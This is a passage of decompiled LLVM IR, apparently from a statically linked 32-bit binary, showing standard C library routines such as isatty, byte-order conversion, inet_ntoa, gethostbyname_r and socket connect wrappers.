  %v4_8052018 = call i32 @strtok_r(i8* %v3_8052018, i32 %arg2, i32 ptrtoint (i32* @global_var_80685c0.722 to i32))
  ret i32 %v4_8052018
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8052030 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8052035 = icmp eq i32 %v3_8052030, 0
  %v1_8052037 = zext i1 %v1_8052035 to i32
  ret i32 %v1_8052037
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052044 = load i32, i32* @esi, align 4
  %v0_8052045 = load i32, i32* @ebx, align 4
  store i32 %v0_8052045, i32* %stack_var_-8, align 4
  %v2_8052049 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8052049, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805205b = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8052049)
  store i32 %v3_805205b, i32* %eax.global-to-local, align 4
  %v1_8052063 = icmp eq i32 %v3_805205b, 0
  store i32 %v3_805205b, i32* @esi, align 4
  %v1_8052067 = icmp eq i1 %v1_8052063, false
  br i1 %v1_8052067, label %dec_label_pc_80520ac, label %dec_label_pc_8052069

dec_label_pc_8052069:                             ; preds = %entry
  %v3_8052069 = load i32, i32* %stack_var_-44, align 4
  %v1_805206d = load i32, i32* @ebx, align 4
  %v2_805206d = inttoptr i32 %v1_805206d to i32*
  store i32 %v3_8052069, i32* %v2_805206d, align 4
  %v1_8052073 = load i32, i32* @ebx, align 4
  %v2_8052073 = add i32 %v1_8052073, 4
  %v3_8052073 = inttoptr i32 %v2_8052073 to i32*
  %v1_805207a = load i32, i32* @ebx, align 4
  %v2_805207a = add i32 %v1_805207a, 8
  %v3_805207a = inttoptr i32 %v2_805207a to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8052081 = load i32, i32* @ebx, align 4
  %v2_8052081 = add i32 %v1_8052081, 12
  %v3_8052081 = inttoptr i32 %v2_8052081 to i32*
  store i32 %tmp3, i32* %v3_8052081, align 4
  %v4_8052084 = zext i8 %tmp to i32
  %v5_8052084 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052084 = and i32 %v5_8052084, -256
  %v7_8052084 = or i32 %v6_8052084, %v4_8052084
  store i32 %v7_8052084, i32* %eax.global-to-local, align 4
  %v2_8052088 = load i32, i32* @ebx, align 4
  %v3_8052088 = add i32 %v2_8052088, 16
  %v4_8052088 = inttoptr i32 %v3_8052088 to i8*
  store i8 %tmp, i8* %v4_8052088, align 1
  %v0_805208b = load i32, i32* %eax.global-to-local, align 4
  %v2_805208e = ptrtoint i32* %stack_var_-27 to i32
  %v0_8052093 = load i32, i32* @ebx, align 4
  %v1_8052093 = add i32 %v0_8052093, 17
  store i32 %v1_8052093, i32* %eax.global-to-local, align 4
  %v4_8052097 = call i32 @__GI_mempcpy(i32 %v1_8052093, i32 %v2_805208e, i32 19, i32 %v0_805208b)
  store i32 %v4_8052097, i32* %eax.global-to-local, align 4
  %v3_80520a4 = inttoptr i32 %v4_8052097 to i8*
  %v4_80520a4 = call i32 @__GI_memset(i8* %v3_80520a4, i32 0, i32 13)
  store i32 %v4_80520a4, i32* %eax.global-to-local, align 4
  %v0_80520af.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80520ac

dec_label_pc_80520ac:                             ; preds = %entry, %dec_label_pc_8052069
  %v0_80520af = phi i32 [ %v3_805205b, %entry ], [ %v0_80520af.pre, %dec_label_pc_8052069 ]
  store i32 %v0_80520af, i32* %eax.global-to-local, align 4
  %v2_80520b1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80520b1, i32* @ebx, align 4
  store i32 %v0_8052044, i32* @esi, align 4
  ret i32 %v0_80520af

; uselistorder directives
  uselistorder i32 %v0_80520af, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80520ac, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_80520b9 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_80520b9 = zext i16 %v3_80520b9 to i32
  ret i32 %v4_80520b9
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_80520c5 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_80520c5
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_80520cd = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_80520cd = zext i16 %v3_80520cd to i32
  ret i32 %v4_80520cd
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80520d9 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_80520d9
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80520dc = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_80520df = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_80520e2 = load i32, i32* @ebx, align 4
  store i32 %v0_80520e2, i32* %stack_var_-12, align 4
  %v1_80520eb = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_80520eb, 16777216
  %v1_80520ed = sdiv i32 %sext, 16777216
  store i32 %v1_80520ed, i32* @ebx, align 4
  %v1_80520ef = add i32 %arg2, 15
  store i32 %v1_80520ef, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80520f4

dec_label_pc_80520f4:                             ; preds = %entry, %dec_label_pc_8052119
  %v0_80520fb17 = phi i32 [ %v1_80520ed, %entry ], [ %v2_8052119, %dec_label_pc_8052119 ]
  %v0_805212516 = phi i32 [ %v1_80520ef, %entry ], [ %v0_805211d, %dec_label_pc_8052119 ]
  %v1_80520ff = urem i32 %v0_80520fb17, 256
  %v5_8052107 = inttoptr i32 %v0_805212516 to i8*
  %v6_8052107 = call i32 @_uintmaxtostr(i8* %v5_8052107, i32 %v1_80520ff, i32 0, i32 -10, i32 0)
  %v0_805210f = load i32, i32* @esi, align 4
  %v1_805210f = icmp eq i32 %v0_805210f, 0
  %v1_8052111 = add i32 %v6_8052107, -1
  store i32 %v1_8052111, i32* %ecx.global-to-local, align 4
  br i1 %v1_805210f, label %dec_label_pc_8052119, label %dec_label_pc_8052116

dec_label_pc_8052116:                             ; preds = %dec_label_pc_80520f4
  %v1_8052116 = inttoptr i32 %v0_805210f to i8*
  store i8 46, i8* %v1_8052116, align 1
  %v0_805211d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052119

dec_label_pc_8052119:                             ; preds = %dec_label_pc_80520f4, %dec_label_pc_8052116
  %v0_805211d = phi i32 [ %v1_8052111, %dec_label_pc_80520f4 ], [ %v0_805211d.pre, %dec_label_pc_8052116 ]
  %v0_8052119 = load i32, i32* @ebx, align 4
  %v2_8052119 = udiv i32 %v0_8052119, 256
  store i32 %v2_8052119, i32* @ebx, align 4
  %v0_805211c = load i32, i32* @edi, align 4
  %v1_805211c = add i32 %v0_805211c, 1
  store i32 %v1_805211c, i32* @edi, align 4
  store i32 %v0_805211d, i32* @esi, align 4
  %v7_8052122 = icmp sgt i32 %v1_805211c, 3
  br i1 %v7_8052122, label %dec_label_pc_8052124, label %dec_label_pc_80520f4

dec_label_pc_8052124:                             ; preds = %dec_label_pc_8052119
  %v2_8052124 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052124, i32* @ebx, align 4
  %v1_8052125 = add i32 %v0_805211d, 1
  store i32 %v0_80520df, i32* @esi, align 4
  store i32 %v0_80520dc, i32* @edi, align 4
  ret i32 %v1_8052125

; uselistorder directives
  uselistorder i32 %v0_805211d, { 0, 2, 1 }
  uselistorder i32 %v1_80520ed, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052119, { 1, 0 }
  uselistorder label %dec_label_pc_80520f4, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8052137 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_80685c4.723 to i32))
  ret i32 %v2_8052137
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052143 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805214c = inttoptr i32 %arg1 to i8*
  %v3_805214c = call i32 @inet_aton(i8* %v2_805214c, i32 %v2_8052143)
  %v1_8052157 = icmp eq i32 %v3_805214c, 0
  br i1 %v1_8052157, label %dec_label_pc_805215f, label %dec_label_pc_805215b

dec_label_pc_805215b:                             ; preds = %entry
  %v3_805215b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805215f

dec_label_pc_805215f:                             ; preds = %entry, %dec_label_pc_805215b
  %v0_805215f = phi i32 [ -1, %entry ], [ %v3_805215b, %dec_label_pc_805215b ]
  ret i32 %v0_805215f

; uselistorder directives
  uselistorder label %dec_label_pc_805215f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805216b = call i32 @__GI___h_errno_location()
  %v0_8052170 = load i32, i32* @edx, align 4
  %v2_8052173 = ptrtoint i32* %stack_var_-4 to i32
  %v9_805218b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80687ac.725, i32 ptrtoint (i32* @global_var_80685e0.724 to i32), i32 460, i32 %v2_8052173, i32 %v0_805216b, i32 %v0_8052170, i32 %v0_8052170)
  %v3_8052190 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8052190
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8052198 = load i32, i32* @ebp, align 4
  %v0_8052199 = load i32, i32* @edi, align 4
  %v0_805219a = load i32, i32* @esi, align 4
  %v0_805219b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_80521ab = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_80521ab, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_80521b6 = icmp eq i32 %arg1, 0
  br i1 %v4_80521b6, label %dec_label_pc_80524c2, label %dec_label_pc_80521c1

dec_label_pc_80521c1:                             ; preds = %entry
  %v1_80521c1 = call i32 @__errno_location(i32 %v0_805219b)
  store i32 %v1_80521c1, i32* %eax.global-to-local, align 4
  %v1_80521c6 = inttoptr i32 %v1_80521c1 to i32*
  %v2_80521c6 = load i32, i32* %v1_80521c6, align 4
  store i32 %v2_80521c6, i32* @edi, align 4
  store i32 %v1_80521c1, i32* @esi, align 4
  store i32 0, i32* %v1_80521c6, align 4
  %v0_80521d9 = load i32, i32* @ebx, align 4
  store i32 %v0_80521d9, i32* %stack_var_-108, align 4
  %v7_80521e5 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_80521d9, i32 %arg5, i32 %arg6, i32 %v1_80521c1)
  store i32 %v7_80521e5, i32* %eax.global-to-local, align 4
  %v1_80521ed = icmp eq i32 %v7_80521e5, 0
  br i1 %v1_80521ed, label %dec_label_pc_80524c2, label %dec_label_pc_80521f5

dec_label_pc_80521f5:                             ; preds = %dec_label_pc_80521c1
  %v1_80521f9 = inttoptr i32 %arg6 to i32*
  %v2_80521f9 = load i32, i32* %v1_80521f9, align 4
  store i32 %v2_80521f9, i32* %edx.global-to-local, align 4
  %v9_80521fb = icmp eq i32 %v2_80521f9, 1
  br i1 %v9_80521fb, label %dec_label_pc_8052215, label %dec_label_pc_8052200

dec_label_pc_8052200:                             ; preds = %dec_label_pc_80521f5
  %v9_8052200 = icmp eq i32 %v2_80521f9, 4
  br i1 %v9_8052200, label %dec_label_pc_8052215, label %dec_label_pc_8052205

dec_label_pc_8052205:                             ; preds = %dec_label_pc_8052200
  %v1_8052205 = add i32 %v2_80521f9, 1
  %v8_8052205 = icmp eq i32 %v1_8052205, 0
  store i32 %v1_8052205, i32* %edx.global-to-local, align 4
  %v1_8052206 = icmp eq i1 %v8_8052205, false
  br i1 %v1_8052206, label %dec_label_pc_80524c2, label %dec_label_pc_805220c

dec_label_pc_805220c:                             ; preds = %dec_label_pc_8052205
  %v0_805220c = load i32, i32* @esi, align 4
  %v1_805220c = inttoptr i32 %v0_805220c to i32*
  %v2_805220c = load i32, i32* %v1_805220c, align 4
  %v11_805220c = icmp eq i32 %v2_805220c, 2
  %v1_805220f = icmp eq i1 %v11_805220c, false
  br i1 %v1_805220f, label %dec_label_pc_80524c2, label %dec_label_pc_8052215

dec_label_pc_8052215:                             ; preds = %dec_label_pc_805220c, %dec_label_pc_8052200, %dec_label_pc_80521f5
  %v0_8052215 = load i32, i32* @ebp, align 4
  %v1_8052217 = sub i32 0, %v0_8052215
  %v1_8052219 = urem i32 %v1_8052217, 4
  %v2_8052219 = icmp eq i32 %v1_8052219, 0
  store i32 %v1_8052219, i32* %eax.global-to-local, align 4
  %v0_805221c = load i32, i32* @edi, align 4
  %v1_805221c = load i32, i32* @esi, align 4
  %v2_805221c = inttoptr i32 %v1_805221c to i32*
  store i32 %v0_805221c, i32* %v2_805221c, align 4
  %v0_8052230.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8052219, label %dec_label_pc_805222c, label %dec_label_pc_8052220

dec_label_pc_8052220:                             ; preds = %dec_label_pc_8052215
  %v1_8052220 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052220 = sub i32 %v0_8052230.pre, %v1_8052220
  %v7_8052220 = icmp ult i32 %v0_8052230.pre, %v1_8052220
  br i1 %v7_8052220, label %dec_label_pc_80524bd, label %dec_label_pc_8052228

dec_label_pc_8052228:                             ; preds = %dec_label_pc_8052220
  %v0_8052228 = load i32, i32* @ebp, align 4
  %v2_8052228 = add i32 %v0_8052228, %v1_8052220
  store i32 %v2_8052228, i32* @ebp, align 4
  store i32 %v2_8052220, i32* @ebx, align 4
  br label %dec_label_pc_805222c

dec_label_pc_805222c:                             ; preds = %dec_label_pc_8052215, %dec_label_pc_8052228
  %v0_8052230 = phi i32 [ %v2_8052220, %dec_label_pc_8052228 ], [ %v0_8052230.pre, %dec_label_pc_8052215 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_80521f9, align 4
  %tmp41 = icmp ult i32 %v0_8052230, 4
  br i1 %tmp41, label %dec_label_pc_80524bd, label %dec_label_pc_805223f

dec_label_pc_805223f:                             ; preds = %dec_label_pc_805222c
  %v0_805223f = load i32, i32* @ebx, align 4
  %v1_805223f = add i32 %v0_805223f, -4
  store i32 %v1_805223f, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_805223f, 8
  br i1 %tmp42, label %dec_label_pc_80524bd, label %dec_label_pc_805224b

dec_label_pc_805224b:                             ; preds = %dec_label_pc_805223f
  %v1_805224b = add i32 %v0_805223f, -12
  store i32 %v1_805224b, i32* %eax.global-to-local, align 4
  %v0_805224e = load i32, i32* @ebp, align 4
  %v1_805224e = add i32 %v0_805224e, 4
  store i32 %v1_805224e, i32* %edx.global-to-local, align 4
  store i32 %v1_805224e, i32* %stack_var_-92, align 4
  %v3_8052257 = inttoptr i32 %v1_805224e to i32*
  store i32 %v0_805224e, i32* %v3_8052257, align 4
  %v0_805225a = load i32, i32* %edx.global-to-local, align 4
  %v1_805225a = add i32 %v0_805225a, 4
  %v2_805225a = inttoptr i32 %v1_805225a to i32*
  store i32 0, i32* %v2_805225a, align 4
  %tmp43 = icmp ult i32 %v1_805224b, 32
  br i1 %tmp43, label %dec_label_pc_80524bd, label %dec_label_pc_8052267

dec_label_pc_8052267:                             ; preds = %dec_label_pc_805224b
  %v0_8052267 = load i32, i32* @ebx, align 4
  %v1_8052267 = add i32 %v0_8052267, -44
  store i32 %v1_8052267, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8052267, 256
  br i1 %tmp44, label %dec_label_pc_80524bd, label %dec_label_pc_805227a

dec_label_pc_805227a:                             ; preds = %dec_label_pc_8052267
  %v0_805227a = load i32, i32* @ebp, align 4
  %v1_805227a = add i32 %v0_805227a, 12
  %v1_8052281 = add i32 %v0_805227a, 44
  store i32 %v1_8052281, i32* @edi, align 4
  store i32 %v1_8052281, i32* %stack_var_-108, align 4
  %v3_805228e = inttoptr i32 %v1_8052281 to i8*
  %v4_805228e = call i32 @strncpy(i8* %v3_805228e, i32 %arg1, i32 %v1_8052267)
  %v0_8052293 = load i32, i32* @edi, align 4
  %v1_8052293 = load i32, i32* @ebp, align 4
  %v2_8052293 = add i32 %v1_8052293, 12
  %v3_8052293 = inttoptr i32 %v2_8052293 to i32*
  store i32 %v0_8052293, i32* %v3_8052293, align 4
  %v1_805229a = add i32 %v0_805227a, 16
  %v2_805229a = inttoptr i32 %v1_805229a to i32*
  store i32 0, i32* %v2_805229a, align 4
  %v2_80522a1 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_80522a1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_80522a3 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_80522a8 = inttoptr i32 %arg1 to i8*
  %v3_80522a8 = call i32 @inet_aton(i8* %v2_80522a8, i32 %v0_80522a3)
  store i32 %v3_80522a8, i32* %eax.global-to-local, align 4
  %v1_80522b0 = icmp eq i32 %v3_80522a8, 0
  br i1 %v1_80522b0, label %dec_label_pc_80522ec, label %dec_label_pc_80522b4

dec_label_pc_80522b4:                             ; preds = %dec_label_pc_805227a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_80522b8 = load i32, i32* @edi, align 4
  store i32 %v0_80522b8, i32* %arg2, align 4
  %v1_80522ba = add i32 %tmp18, 8
  %v2_80522ba = inttoptr i32 %v1_80522ba to i32*
  store i32 2, i32* %v2_80522ba, align 4
  %v0_80522c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80522c1 = add i32 %v0_80522c1, 12
  %v2_80522c1 = inttoptr i32 %v1_80522c1 to i32*
  store i32 4, i32* %v2_80522c1, align 4
  %v2_80522c8 = load i32, i32* %stack_var_-92, align 4
  %v1_80522cb = load i32, i32* %edx.global-to-local, align 4
  %v2_80522cb = add i32 %v1_80522cb, 16
  %v3_80522cb = inttoptr i32 %v2_80522cb to i32*
  store i32 %v2_80522c8, i32* %v3_80522cb, align 4
  %v1_80522d2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80522d2 = add i32 %v1_80522d2, 4
  %v3_80522d2 = inttoptr i32 %v2_80522d2 to i32*
  store i32 %v1_805227a, i32* %v3_80522d2, align 4
  %v0_80522d9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80522d9, i32* %v1_80521ab, align 4
  store i32 0, i32* %v1_80521f9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80524c2

dec_label_pc_80522ec:                             ; preds = %dec_label_pc_805227a
  %v0_80522ec = call i32 @__open_nameservers()
  store i32 %v0_80522ec, i32* @eax, align 4
  %v2_80522fc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_80522fc, i32* @ebx, align 4
  store i32 %v2_80522fc, i32* %stack_var_-108, align 4
  %v2_8052301 = call i32 @__pthread_return_void(i32 %v2_80522fc, i32 134562299)
  store i32 %v2_8052301, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %stack_var_-108, align 4
  %v1_805230d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062548.726 to i32))
  %v0_8052312 = load i32, i32* @global_var_8068c34.727, align 4
  store i32 %v0_8052312, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* @ecx, align 4
  store i32 134562299, i32* @eax, align 4
  store i32 %v2_80522fc, i32* %stack_var_-108, align 4
  %v2_805231d = call i32 @__pthread_return_void(i32 %v2_80522fc, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8052338 = ptrtoint i32* %stack_var_-76 to i32
  %v2_805233d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805233d, i32* %eax.global-to-local, align 4
  store i32 %v2_805233d, i32* %stack_var_-108, align 4
  %v0_8052347 = load i32, i32* @esi, align 4
  %v7_805234e = call i32 @__dns_lookup(i8* %v2_80522a8, i32 1, i32 %v0_8052347, i32 ptrtoint (i32* @global_var_8068c28.728 to i32), i32 %v2_805233d, i32 %v2_8052338)
  store i32 %v7_805234e, i32* %eax.global-to-local, align 4
  %v2_8052356 = icmp slt i32 %v7_805234e, 0
  %v1_8052358 = icmp eq i1 %v2_8052356, false
  br i1 %v1_8052358, label %dec_label_pc_805236e, label %dec_label_pc_805235a

dec_label_pc_805235a:                             ; preds = %dec_label_pc_80522ec
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_80521f9, align 4
  br label %dec_label_pc_80524c2

dec_label_pc_805236e:                             ; preds = %dec_label_pc_80522ec
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052381 = icmp ugt i32 %v1_8052267, 256
  %v15_8052381 = icmp eq i32 %v0_8052267, 300
  %v2_8052385 = or i1 %v10_8052381, %v15_8052381
  br i1 %v2_8052385, label %dec_label_pc_8052420, label %dec_label_pc_8052387

dec_label_pc_8052387:                             ; preds = %dec_label_pc_805236e
  %v3_805238a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805238a, i32* %stack_var_-108, align 4
  %v1_805238e = call i32 @free(i32 %v3_805238a)
  store i32 %v1_805238e, i32* %eax.global-to-local, align 4
  store i32 %v3_805238a, i32* @edi, align 4
  %v3_8052394 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052394, i32* %stack_var_-108, align 4
  %v1_8052398 = call i32 @free(i32 %v3_8052394)
  store i32 -1, i32* %v1_80521f9, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052498

dec_label_pc_8052420:                             ; preds = %dec_label_pc_805236e
  %v3_8052425.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8052429.pre = load i32, i32* @edi, align 4
  store i32 %v0_8052429.pre, i32* %stack_var_-108, align 4
  %v3_805242a = inttoptr i32 %v0_8052429.pre to i8*
  %v4_805242a = call i32 @strncpy(i8* %v3_805242a, i32 %v3_8052425.pre, i32 %v1_8052267)
  store i32 %v4_805242a, i32* %eax.global-to-local, align 4
  %v3_8052430 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052430, i32* %stack_var_-108, align 4
  %v1_8052434 = call i32 @free(i32 %v3_8052430)
  store i32 %v1_8052434, i32* %eax.global-to-local, align 4
  %v12_805243c = icmp eq i32 %tmp10, 1
  %v1_8052441 = icmp eq i1 %v12_805243c, false
  br i1 %v1_8052441, label %dec_label_pc_805249d, label %dec_label_pc_8052443

dec_label_pc_8052443:                             ; preds = %dec_label_pc_8052420
  %v0_8052443 = load i32, i32* @edx, align 4
  %v0_805244a = load i32, i32* @ebp, align 4
  store i32 %v0_805244a, i32* %stack_var_-108, align 4
  %v3_805244b = inttoptr i32 %tmp to i16*
  %v4_805244b = call i32 @memcpy(i16* %v3_805244b, i32 4, i32 %v0_8052443)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8052454 = load i32, i32* @edi, align 4
  store i32 %v0_8052454, i32* %arg2, align 4
  %v1_8052456 = add i32 %tmp18, 8
  %v2_8052456 = inttoptr i32 %v1_8052456 to i32*
  store i32 2, i32* %v2_8052456, align 4
  %v0_805245d = load i32, i32* %eax.global-to-local, align 4
  %v1_805245d = add i32 %v0_805245d, 12
  %v2_805245d = inttoptr i32 %v1_805245d to i32*
  store i32 4, i32* %v2_805245d, align 4
  %v3_8052464 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8052464, i32* %edx.global-to-local, align 4
  %v1_8052468 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052468 = add i32 %v1_8052468, 16
  %v3_8052468 = inttoptr i32 %v2_8052468 to i32*
  store i32 %v3_8052464, i32* %v3_8052468, align 4
  %v1_805246f = load i32, i32* %eax.global-to-local, align 4
  %v2_805246f = add i32 %v1_805246f, 4
  %v3_805246f = inttoptr i32 %v2_805246f to i32*
  store i32 %v1_805227a, i32* %v3_805246f, align 4
  %v2_8052472 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052472, i32* %eax.global-to-local, align 4
  %v3_8052473 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052473, i32* %stack_var_-108, align 4
  %v1_8052477 = call i32 @free(i32 %v3_8052473)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_80521ab, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_80521f9, align 4
  br label %dec_label_pc_8052498

dec_label_pc_8052498:                             ; preds = %dec_label_pc_805249d, %dec_label_pc_8052387, %dec_label_pc_8052443
  br label %dec_label_pc_80524c2

dec_label_pc_805249d:                             ; preds = %dec_label_pc_8052420
  %v3_80524a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80524a0, i32* %stack_var_-108, align 4
  %v1_80524a4 = call i32 @free(i32 %v3_80524a0)
  store i32 1, i32* %v1_80521f9, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052498

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_8052267, %dec_label_pc_805224b, %dec_label_pc_805223f, %dec_label_pc_805222c, %dec_label_pc_8052220
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80524c2

dec_label_pc_80524c2:                             ; preds = %dec_label_pc_805220c, %dec_label_pc_8052205, %dec_label_pc_80521c1, %entry, %dec_label_pc_8052498, %dec_label_pc_805235a, %dec_label_pc_80522b4, %dec_label_pc_80524bd
  store i32 %v0_805219b, i32* @ebx, align 4
  store i32 %v0_805219a, i32* @esi, align 4
  store i32 %v0_8052199, i32* @edi, align 4
  store i32 %v0_8052198, i32* @ebp, align 4
  %v0_80524c9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80524c9

; uselistorder directives
  uselistorder i32 %v2_80522fc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8052281, { 1, 0, 2 }
  uselistorder i32 %v1_805227a, { 1, 0 }
  uselistorder i32 %v1_8052267, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8052230.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8052219, { 1, 0 }
  uselistorder i32 %v2_80521f9, { 2, 0, 1, 3 }
  uselistorder i32* %v1_80521f9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_80521ab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80524c2, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052498, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805222c, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80524e7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80524ee = call i32 @__socketcall(i32 3, i32 %v2_80524e7)
  ret i32 %v2_80524ee

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052513 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805251a = call i32 @__socketcall(i32 6, i32 %v2_8052513)
  ret i32 %v2_805251a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

